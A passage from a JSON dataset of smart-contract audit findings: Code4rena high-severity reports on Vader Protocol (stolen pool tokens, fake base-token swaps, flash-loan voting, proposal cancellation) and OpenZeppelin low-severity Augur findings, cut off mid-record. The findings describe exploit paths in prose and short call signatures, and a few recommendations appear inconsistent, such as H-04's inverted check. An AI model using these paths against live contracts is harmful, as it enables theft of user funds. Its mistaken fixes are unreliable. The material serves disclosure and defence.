      "title": "[H-14] Missing access restriction on lockUnits/unlockUnits",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\nThe `Pool.lockUnits` allows anyone to steal pool tokens from a `member` and assign them to `msg.sender`.\n\n## Impact\n\nAnyone can steal pool tokens from any other user.\n\n## Recommended Mitigation Steps\n\nAdd access control and require that `msg.sender` is the router or another authorized party.",
      "summary": "\nThis bug report concerns a vulnerability in the `Pool.lockUnits` function that allows anyone to steal tokens from a pool member and assign them to themselves. This is a serious issue as it allows malicious actors to take advantage of unsuspecting users. The recommended mitigation steps are to add access control and require that `msg.sender` is the router or another authorized party. This will help prevent malicious actors from exploiting the vulnerability and stealing tokens from unsuspecting users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/208",
      "tags": [],
      "finders": []
    },
    {
      "id": "3916",
      "title": "[H-13] 4 Synths can be minted with fake base token",
      "impact": "HIGH",
      "content": "\nThe `Pools.mintSynth` function does not check if `base` is one of the base tokens. One can transfer `token`s to the pool and set `base=token` and call `mintSynth(token, token, member)`.\n\nThe `_actualInput = getAddedAmount(base, token);` will return the **token** amount added but use the ratio compared to the **base** reserve `calcSwapOutput(_actualInput=tokenInput, mapToken_baseAmount[token], mapToken_tokenAmount[token]); = tokenIn / baseAmount * tokenAmount` which yields a wrong swap result.\n\nIt breaks the accounting for the pool as `token`s are transferred in, but the `base` balance is increased.\n\nThe amount that is minted could also be inflated (cheaper than sending the actual base tokens), especially if `token` is a high-precision token or worth less than base.\n\nRecommend checking that `base` is either `USDV` or `VADER` in `mintSynth`.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/207#issuecomment-830610147):**\n > Valid, funds can be lost.\n\n**[strictly-scarce (vader) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/207#issuecomment-830610260):**\n > would bundle this issue with:\n> https://github.com/code-423n4/2021-04-vader-findings/issues/205\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Pools.mintSynth` function in which it does not check if `base` is one of the base tokens. This means that when a user transfers a `token` to the pool and sets `base=token`, then the `_actualInput` will be the `token` amount added but the ratio will be compared to the `base` reserve which yields a wrong swap result.\n\nThe impact of this vulnerability is that it breaks the accounting for the pool since `token`s are transferred in, but the `base` balance is increased. Furthermore, the amount that is minted could also be inflated (cheaper than sending the actual base tokens), especially if `token` is a high-precision token or worth less than base.\n\nThe recommended mitigation step for this vulnerability is to check that `base` is either `USDV` or `VADER` in `mintSynth`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/207",
      "tags": [],
      "finders": []
    },
    {
      "id": "3915",
      "title": "[H-12] getAddedAmount can return wrong results",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\nThe `getAddedAmount` function only works correctly when called with `(VADER/USDV, pool)` or `(pool, pool)`.\nHowever, when called with (`token, pool)` where `token` is neither `VADER/USDV/pool`, it returns wrong results:\n\n1. It gets the `token` balance\n2. And subtracts it from the stored `mapToken_tokenAmount[_pool]` amount which can be that of a completely different token\n\n## Impact\n\nAnyone can break individual pairs by calling `sync(token1, token2)` where the `token1` balance is less than `mapToken_tokenAmount[token2]`. This will add the difference to `mapToken_tokenAmount[token2]` and break the accounting and result in a wrong swap logic.\n\nFurthermore, this can also be used to swap tokens without having to pay anthing with `swap(token1, token2, member, toBase=false)`.\n\n## Recommended Mitigation Steps\n\nAdd a require statement in the `else` branch that checks that `_token == _pool`.",
      "summary": "\nThis bug report is about a function called `getAddedAmount` that is part of a software system. When called with certain parameters, the function returns incorrect results. Specifically, when called with `(token, pool)` where `token` is neither `VADER/USDV/pool`, it returns the balance of `token` instead of the stored `mapToken_tokenAmount[_pool]` amount. This can be exploited to break individual pairs and swap tokens without having to pay anything.\n\nThe recommended mitigation step is to add a require statement in the `else` branch that checks that `_token == _pool`. This will ensure that the correct amount is returned when the function is called.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/206",
      "tags": [],
      "finders": []
    },
    {
      "id": "3914",
      "title": "[H-11] Swap token can be traded as fake base token",
      "impact": "HIGH",
      "content": "\nThe `Pools.swap` function does not check if `base` is one of the base tokens. One can transfer `token`s to the pool and set `base=token` and call `swap(token, token, member, toBase=false)`\n\nThe `_actualInput = getAddedAmount(base, token);` will return the **token** amount added but use the ratio compared to the **base** reserve `calcSwapOutput(_actualInput=tokenInput, mapToken_baseAmount[token], mapToken_tokenAmount[token]); = tokenIn / baseAmount * tokenAmount` which yields a wrong swap result.\n\nIt breaks the accounting for the pool as `token`s are transferred in, but the `base` balance is increased (and `token` balance decreased). LPs cannot correctly withdraw again, and others cannot correctly swap again.\n\nAnother example scenario is that the token pool amount can be stolen.\nSend `tokenIn=baseAmount` of tokens to the pool and call `swap(base=token, token, member, toBase=false)`. Depending on the price of `token` relative to `base` this could be cheaper than trading with the base tokens.\n\nRecommend checking that `base` is either `USDV` or `VADER`.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/205#issuecomment-830609893):**\n > Valid, funds can be lost\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Pools.swap` function of a codebase. The function does not check if `base` is one of the base tokens, which can lead to incorrect results. This can break the accounting for the pool, as tokens are transferred in but the base balance is increased (and token decreased). Additionally, it could lead to the token pool amount being stolen.\n\nThe recommended mitigation step is to check that `base` is either `USDV` or `VADER`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/205",
      "tags": [],
      "finders": []
    },
    {
      "id": "3913",
      "title": "[H-10] Anyone can list anchors / curate tokens",
      "impact": "HIGH",
      "content": "\nThe `Router.listAnchor` function can be called by anyone and tokens can be added. The only check is that `require(iPOOLS(POOLS).isAnchor(token));` but this can easily be set by calling `Pools.addLiquidity(VADER, token, _)` once even without actually sending any tokens to the contract. This makes it an essentially useless check.\n\nThis only works initially as long as the `anchorLimit` has not been reached yet.\nHowever, the `replaceAnchor` can be used in the same way and flash loans can be used to get around the liquidity restrictions and push another anchor token out of the price range as these checks use the current reserves.\n\nAnchored pools are automatically curated pools and determine if a pool receives rewards. An attacker can remove rewards of a curated pool this way and add rewards to their own pool with a custom token they control.\n\nAfter a pool has been anchored through flash loans, liquidity can be withdrawn which could make the anchor price easy to manipulate in the next block and launch other attacks.\n\nRecommend revisiting the `_isAnchor[token] = true;` statement in `addLiquidity`, it seems strange without any further checks.\nConsider making `listAnchor` / `replaceAnchor` DAO-only functions and make them flash-loan secure.\nOne should probably use time-weighted prices for these pools for the bounds check.\n\n**[strictly-scarce (vader) disputed](https://github.com/code-423n4/2021-04-vader-findings/issues/211#issuecomment-828472672):**\n > The protocol is intended to be launched with 5 anchors so it can only be attacked by using `replaceAnchor()`, in which case slip-based fees apply for attacks and thwart the attack path.\n\n",
      "summary": "\nThis bug report is about the vulnerability in the `Router.listAnchor` function, which can be called by anyone and tokens can be added with just a simple check. This allows anyone to remove rewards from a curated pool and add rewards to their own pool with a token they control. The impact of this vulnerability is that attackers can manipulate the anchor price and launch other attacks by withdrawing the liquidity.\n\nThe recommended mitigation steps to address this vulnerability is to revisit the `_isAnchor[token] = true;` statement in `addLiquidity` and make `listAnchor` / `replaceAnchor` DAO-only functions that are flash-loan secure. Additionally, one should use time-weighted prices for these pools for the bounds check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/211",
      "tags": [],
      "finders": []
    },
    {
      "id": "3912",
      "title": "[H-09] Incorrect initialization gives IL protection of only 1 second instead of 100 days in Router.sol",
      "impact": "HIGH",
      "content": "\nIncorrect initialization of `timeForFullProtection` to 1 sec instead of 8640000 secs (100 days) as indicated in code comments, appears to be a test setting mistakenly carried over for deployment. Therefore, unless `timeForFullProtection` is reset to 100 days by `setParams()` (calling this function is a missing functionality in the DAO currently), the Impermanent Loss (IL) protection \"rule\" of 100 days will not apply in `Utils.getProtection()`.\n\nThis breaks a key value proposition of the Vader protocol which is IL protection as indicated in the specification:\n> “Impermanent Loss Protection: The deposit value for each member is recorded when they deposit. When they go to withdraw, the redemption value is computed. If it is less than the deposit value, the member is paid the deficit from the reserve. The protection issued increases from 0 to 100% linearly for 100 days.”\n\nRecommend changing to ```“timeForFullProtection = 8640000; //100 days” ``` on L84\n\n**[strictly-scarce (vader) disputed](https://github.com/code-423n4/2021-04-vader-findings/issues/84#issuecomment-830597447):**\n> It's deliberately set to 1 second to conduct adequate testing.\n\n",
      "summary": "\nThis bug report is about the incorrect initialization of timeForFullProtection to 1 sec instead of 8640000 secs (100 days) in the Vader protocol. This incorrect initialization means that the Impermanent Loss (IL) protection \"rule\" of 100 days will not apply in Utils.getProtection(). This breaks a key value proposition of the Vader protocol, which is IL protection as indicated in the specification. The bug was found using manual analysis and the proof of concept is provided in the report. The recommended mitigation step is to change the timeForFullProtection to 8640000 secs (100 days) on line 84.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/84",
      "tags": [],
      "finders": []
    },
    {
      "id": "3911",
      "title": "[H-08] Wrong liquidity units calculation",
      "impact": "HIGH",
      "content": "\nThe spec defines the number of LP units to be minted as `units = (P (a B + A b))/(2 A B) * slipAdjustment = P * (part1 + part2) / part3 * slipAdjustments` but the `Utils.calcLiquidityUnits` function computes `((P * part1) + part2) / part3 * slipAdjustments`.\n\nThe associativity on `P * part1` is wrong, and `part2` is not multiplied by `P`.\n\nThe math from the spec is not correctly implemented and could lead to the protocol being economically exploited, as redeeming the minted LP tokens does not result in the initial tokens anymore.\n\nRecommend fixing the equation.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/204#issuecomment-830609695):**\n> Valid, but funds not at risk.\n\n",
      "summary": "\nThis bug report is about a discrepancy between the calculation of liquidity units in the spec and the function that implements it. The equation in the function is incorrect, which could lead to the protocol being economically exploited. To fix this issue, the equation needs to be corrected so that it matches the spec.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/204",
      "tags": [],
      "finders": []
    },
    {
      "id": "3910",
      "title": "[H-07] Wrong calcAsymmetricShare calculation",
      "impact": "HIGH",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe inline-comment defines the number of asymmetric shares as `(u * U * (2 * A^2 - 2 * U * u + U^2))/U^3` but the `Utils.calcAsymmetricShare` function computes `(uA * 2U^2 - 2uU + u^2) / U^3` which is not equivalent as can be seen from the `A^2` term in the first term which does not occur in the second one.\nThe associativity on `P * part1` is wrong, and `part2` is not multiplied by `P`.\n\n## Impact\n\nThe math from the spec is not correctly implemented and could lead to the protocol being economically exploited, as the asymmetric share which is used to determine the collateral value in base tokens could be wrong.\nFor example, it might be possible to borrow more than the collateral put up.\n\n## Recommended Mitigation Steps\n\nClarify if the comment is correct or the code and fix them.",
      "summary": "\nThis bug report is regarding an issue in the code of a protocol that could lead to it being economically exploited. The inline comment in the code defines the number of asymmetric shares as one equation, but the function calculates it as a different equation. This difference could lead to it being possible to borrow more than the collateral put up. To fix the issue, it is recommended to clarify if the comment is correct or the code and fix them accordingly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/214",
      "tags": [],
      "finders": []
    },
    {
      "id": "3909",
      "title": "[H-06] Incorrect burn address in Vader.sol",
      "impact": "HIGH",
      "content": "\nThe `internal _transfer()` function is called from external facing `transfer()`, `transferFrom()`, and `transferTo()` functions all of which have different sender addresses. It is `msg.sender` for `transfer()`, sender parameter for `transferFrom()` and `tx.origin` for `transferTo()`.\n\nThese different senders are reflected in the sender parameter of `_transfer()` function. While this sender parameter is correctly used for transfer of tokens within `_transfer`, the call to `_burn()` on L129 incorrectly uses `msg.sender` as the burn address which is correct only in the case of the `transfer()` caller's context. This is incorrect for `transferFrom()` and `transferTo()` caller contexts.\n\nThis will incorrectly burn the fees from a different (intermediate contract) account for all users of the protocol interacting with the `transferTo()` and `transferFrom()` functions and lead to incorrect accounting of token balances or exceptional conditions. Protocol will break and lead to fund loss.\n\nRecommend changing L129 to: `_burn(sender, _fee);`\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/202#issuecomment-830609535):**\n > Valid, disagree with severity though. Funds-not-at-risk.\n> Recommend: 2\n\n",
      "summary": "\nThis bug report is about a vulnerability in the _transfer() function of the Vader protocol. It is called from external facing transfer(), transferFrom() and transferTo() functions, which have different sender addresses. The problem occurs when the call to _burn() on line 129 incorrectly uses msg.sender as the burn address, which is only correct in the case of the transfer() caller's context. This will incorrectly burn the fees from a different (intermediate contract) account for all users of the protocol interacting with the transferTo() and transferFrom() functions, leading to incorrect accounting of token balances or exceptional conditions. The protocol will break and lead to fund loss.\n\nThe proof of concept can be found in the provided GitHub links. The vulnerability was found using manual analysis. The recommended mitigation step is to change line 129 to _burn(sender, _fee);.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/202",
      "tags": [],
      "finders": []
    },
    {
      "id": "3908",
      "title": "[H-05] Flash loans can affect governance voting in DAO.sol",
      "impact": "HIGH",
      "content": "\nFlash loans can significantly increase a single voter's weight and be used to impact the voting outcome. A voter can borrow a significant quantity of tokens to increase their voting weight in a transaction within which, they also deterministically  influence the voting outcome to their choice.\n\nThis has already happened in the case of MakerDAO governance where [a flash loan was used to affect voting outcome](https://forum.makerdao.com/t/urgent-flash-loans-and-securing-the-maker-protocol/4901) and noted by the Maker team as: “a practical example for the community that flash loans can and may impact system governance”\n\nGiven that flash loans are a noted concern, the impact of it to DAO governance which can control all critical protocol parameters should be mitigated as in other places.\n\nRecommend accounting for flash loans in `countMemberVotes()` by using weight from previous blocks or consider capping the weight of individual voters. ([L158-L163](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/DAO.sol#L158-L163))\n\n**[strictly-scarce (vader) disputed](https://github.com/code-423n4/2021-04-vader-findings/issues/187#issuecomment-830608957):**\n > Not valid.\n> All pools use slip-based fees so flash loan attack by buying up USDV or synths is not going to work.\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/187#issuecomment-847890126):**\n > The funds to execute this attack do not need to come from a pool. It could be done as simply as malicious members pooling their funds in a flash loan contract, and each borrowing the funds in turn to vote.\n\n",
      "summary": "\nThis bug report is about a vulnerability in DAO governance which can be exploited by flash loans. Flash loans allow a single voter to increase their voting weight significantly and influence the voting outcome to their choice. This has already been seen in the MakerDAO governance. The proof of concept is a link to a GitHub code and the recommended mitigation steps are to account for flash loans in countMemberVotes() by using weight from previous blocks or consider capping the weight of individual voters.\n\nFlash loans are a serious vulnerability that can be used to manipulate the voting outcome in DAO governance. Flash loans allow a single voter to borrow a large amount of tokens in order to increase their voting weight and influence the voting outcome. This has already been observed in the MakerDAO governance and is a serious concern.\n\nIn order to mitigate this vulnerability, the code should be changed to account for flash loans in countMemberVotes() by using weight from previous blocks or consider capping the weight of individual voters. This will help to ensure that the voting outcome is not manipulated by a single voter.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/187",
      "tags": [],
      "finders": []
    },
    {
      "id": "3907",
      "title": "[H-04] Proposals can be cancelled",
      "impact": "HIGH",
      "content": "Anyone can cancel any proposals by calling `DAO.cancelProposal(id, id)` with `oldProposalID == newProposalID`.\nThis always passes the minority check as the proposal was approved.\n\nAn attacker can launch a denial of service attack on the DAO governance and prevent any proposals from being executed.\n\nRecommend checking that `oldProposalID` == `newProposalID`\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/227#issuecomment-828455719):**\n > This is valid, can fix with a `require()`\n\n\n**[strictly-scarce (vader) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/227#issuecomment-830634810):**\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the DAO governance system that allows anyone to cancel any proposals by calling `DAO.cancelProposal(id, id)` with `oldProposalID == newProposalID`. This vulnerability could be used to launch a denial of service attack on the DAO governance, preventing any proposals from being executed. The recommended mitigation step is to check `oldProposalID == newProposalID`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/227",
      "tags": [],
      "finders": []
    },
    {
      "id": "3906",
      "title": "[H-03] Missing DAO functionality to call changeDAO() function in Vader.sol",
      "impact": "HIGH",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nchangeDAO() is authorized to be called only from the DAO (per modifier) but DAO contract has no corresponding functionality to call changeDAO() function. As a result, DAO address cannot be changed.\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L192-L196\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd functionality to DAO to be able to call changeDAO() of Vader.sol.",
      "summary": "\nThis bug report describes a vulnerability in the Vader.sol smart contract. The changeDAO() function is authorized to be called only from the DAO, but the DAO contract has no corresponding functionality to call changeDAO(). As a result, the DAO address cannot be changed. This was discovered through manual analysis and a proof of concept can be found at the given link. The recommended mitigation step is to add functionality to the DAO to call the changeDAO() function of Vader.sol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/161",
      "tags": [],
      "finders": []
    },
    {
      "id": "3905",
      "title": "[H-02] Flash attack mitigation does not work as intended in USDV.sol",
      "impact": "HIGH",
      "content": "\nOne of the stated protocol (review) goals is to detect susceptibility to “Any attack vectors using flash loans on Anchor price, synths or lending.” As such, USDV contract aims to protect against flash attacks using `flashProof()` modifier which uses the following check in `isMature()` to determine if currently executing contract context is at least `blockDelay` duration ahead of the previous context: ```lastBlock[tx.origin] + blockDelay <= block.number```\n\nHowever, `blockDelay` state variable is not initialized which means it has a default uint value of 0. So unless it is set to >= 1 by `setParams()` which can be called only by the DAO (which currently does not have the capability to call `setParams()` function), `blockDelay` will be 0, which allows current executing context (`block.number`) to be the same as the previous one (`lastBlock[tx.origin]`). This effectively allows multiple calls on this contract to be executed in the same transaction of a block which enables flash attacks as opposed to what is expected as commented on [L41](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/USDV.sol#L140-L142): \"// Stops an EOA from doing a flash attack in the same block\"\n\nEven if the DAO can call `setParams()` to change `blockDelay` to >= 1, there is a big window of opportunity for flash attacks until the DAO votes, finalizes and approves such a proposal. Moreover, such proposals can be cancelled by a DAO minority or replaced by a malicious DAO minority to launch flash attacks.\n\nRecommend initalizing `blockDelay` to >= 1 at declaration or in constructor.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/138#issuecomment-830606188):**\n\n> The actual issue is simply:\n\n> > `blockDelay` state variable is not initialized\n>\n> It is intended to be initialised to 1, so this is a bug. Severity: 2\n\n",
      "summary": "\nThis bug report is about a vulnerability in the USDV contract which is part of the Vader Protocol. The issue is that the blockDelay state variable is not initialized, which means it has a default uint value of 0. This allows multiple calls on the contract to be executed in the same transaction of a block, which enables flash attacks. The proof of concept can be found in the provided links. The recommended mitigation step is to initialize blockDelay to a value greater than or equal to 1 at declaration or in the constructor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/138",
      "tags": [],
      "finders": []
    },
    {
      "id": "3904",
      "title": "[H-01] Unhandled return value of transfer in transferOut() of Pools.sol",
      "impact": "HIGH",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nERC20 implementations are not always consistent. Some implementations of transfer and transferFrom could return ‘false’ on failure instead of reverting. It is safer to wrap such calls into require() statements to handle these failures.\n\nThe transfer call on L211 of transferOut() could be made on a user-supplied untrusted token address (from the different call sites) whose implementation can be malicious.\n\nFor reference, see similar finding from Consensys Diligence Audit of Aave Protocol V2\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L211\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nUse require to check the return value and revert on 0/false or use OpenZeppelin’s SafeERC20 wrapper functions.",
      "summary": "\nThis bug report is about an issue with ERC20 implementations, which can return false instead of reverting on failure. This could be exploited by malicious actors if the transfer call on L211 of transferOut() is made on a user-supplied untrusted token address. The bug was identified through manual analysis. To mitigate this issue, it is recommended to use require to check the return value and revert on 0/false or use OpenZeppelin’s SafeERC20 wrapper functions. This finding is similar to one from Consensys Diligence Audit of Aave Protocol V2.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/128",
      "tags": [],
      "finders": []
    },
    {
      "id": "11541",
      "title": "[L20] Outdated test coverage report",
      "impact": "LOW",
      "content": "The [test coverage report](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core#coverage-report) has not been updated for Augur Core v2 code base. Without this report it is impossible to know whether there are parts of the code never executed by the automated tests; so for every change, a full manual test suite has to be executed to make sure that nothing is broken or misbehaving.\n\n\nConsider updating the test coverage report, and making it reach at least 95% of the source code.\n\n\n***Update****: fixed in* [*`88e7aa0`*](https://github.com/AugurProject/augur/commit/88e7aa0bafb98520bc0efb8d2d54a335c2acc6bc) *by revamping the entire test coverage setup.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11540",
      "title": "[L19] Outdated and inaccurate README file",
      "impact": "LOW",
      "content": "The [README.md](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/README.md) file in the augur-core repository is out of date and inaccurate. It does not reflect the v2 changes, some of the suggested commands do not work, and the build is failing. In particular, some of the identified issues are:\n\n\n* The [“Source code organization”](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core#source-code-organization) section is missing the `legacy_reputation` folder.\n* In the [“Docker — Test” subsection](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core#docker) there is a link pointing to [Augur’s old, deprecated repository](https://github.com/AugurProject/augur-core). This is the same in the [“Worst-case-loss for trades”](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core#worst-case-loss-escrow-for-trades) section.\n* The Reporting flow diagram mentioned in [“Reporting diagrams”](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core#reporting-diagrams) is outdated.\n* There are [instructions](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core#running-oyente) to run [Oyente](https://github.com/melonproject/oyente), a smart contract analysis tool that has not been updated in more than a year and is unclear if it works properly with Solidity +0.5. According to the Oyente’s output when run with a test contract: *“The latest supported version is 0.4.19”*.\n* The list of files and folders in the [“Tests” section](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core#tests) is clearly outdated, with many inconsistencies (*e.g.* `delegation_sandbox.py` and `test_mutex.py` are listed but do not exist in [the](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/tests) [`tests`](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/tests) [folder](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/tests)).\n* [The coverage report](https://github.com/AugurProject/augur/tree/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core#coverage-report) is outdated and the suggested command does not work.\n\n\nREADME files on the root of git repositories are the first documents that most developers often read, so they should be complete, clear, concise and accurate. To define the structure and contents of this file, consider following [Standard Readme](https://github.com/RichardLitt/standard-readme). Furthermore, it is highly advisable to include instructions for the [responsible disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure) of any security vulnerabilities found in the project.\n\n\n***Update****: fixed in* [*`c629b50`*](https://github.com/AugurProject/augur/commit/c629b5069b89d5596f9f876eb222b454b07edac7) *by updating the README file where appropriate.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11539",
      "title": "[L18] Undocumented assembly blocks",
      "impact": "LOW",
      "content": "The `CloneFactory` contract in `CloneFactory.sol` includes a function `createClone` with [an assembly block](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/libraries/CloneFactory.sol#L9). Even though the function is taken from [EIP 1167](https://eips.ethereum.org/EIPS/eip-1167) where the functionality is documented, assembly is a low-level language that is harder to parse by readers. Consider including extensive inline documentation clearly explaining what every single assembly instruction does. This will make it easier for users to trust the code, for reviewers to verify it, and for developers to build on top of it or update it. Note that the use of assembly discards several important safety features of Solidity, which may render the code less safe and more error-prone. Hence, consider implementing thorough tests to cover all potential use cases of the `createClone` function to ensure it behaves as expected.\n\n\n***Update:*** *fixed in* [*`fe274f5`*](https://github.com/AugurProject/augur/commit/fe274f5fcf623c97355b051d2db212d47e22ce72) *by adding explanatory inline comments for each assembly instruction.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11538",
      "title": "[L17] Not using safe arithmetic operations",
      "impact": "LOW",
      "content": "Several arithmetic operations in the code base are not using the available `SafeMathUint256` and `SafeMathInt256` libraries that would prevent arithmetic issues. See for example [line 455 in](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L455) [`Market.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L455), line [147 in](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L147) [`Universe.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Universe.sol#L147) or lines [245](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/Orders.sol#L245), [246](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/Orders.sol#L246), 